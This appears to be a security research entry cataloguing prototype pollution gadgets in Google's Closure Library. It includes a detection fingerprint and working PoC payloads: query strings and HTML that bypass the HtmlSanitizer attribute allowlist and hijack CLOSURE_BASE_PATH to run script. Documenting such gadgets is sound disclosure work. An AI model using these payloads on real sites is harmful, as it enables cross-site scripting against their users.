## Closure

URL: https://github.com/google/closure-library/

### JS Fingerprint
```
return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')
```

### Vulnerable code fragment
https://github.com/google/closure-library/blob/5a0002f16c91d41f5de3dc7bdcafe9b74b1b4fa0/closure/goog/html/sanitizer/attributewhitelist.js#L22-L107
```js
goog.html.sanitizer.AttributeWhitelist = {
  '* ARIA-CHECKED': true,
  '* ARIA-COLCOUNT': true,
  '* ARIA-COLINDEX': true,
  '* ARIA-CONTROLS': true,
  '* ARIA-DESCRIBEDBY': tru
...
}
```
https://github.com/google/closure-library/blob/88f3857a26ec5ead36b4b49cb6c3f011cc534971/closure/goog/base.js#L2210-L2214
```js
  goog.findBasePath_ = function() {
    if (goog.global.CLOSURE_BASE_PATH != undefined &&
        // Anti DOM-clobbering runtime check (b/37736576).
        typeof goog.global.CLOSURE_BASE_PATH === 'string') {
      goog.basePath = goog.global.CLOSURE_BASE_PATH;
```

### PoC

#### AttributeWhitelist

```
?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1
```

```html
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
  goog.require('goog.html.sanitizer.HtmlSanitizer');
  goog.require('goog.dom');
</script>
<body>
<script>
  const html = '<img src onerror=alert(1)>';
  const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
  const sanitized = sanitizer.sanitize(html);
  const node = goog.dom.safeHtmlToNode(sanitized);
          
  document.body.append(node);
</script>
```

#### CLOSURE_BASE_PATH

```
?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
```

```html
<script>
  Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
  goog.require('goog.html.sanitizer.HtmlSanitizer');
  goog.require('goog.dom');
</script>
```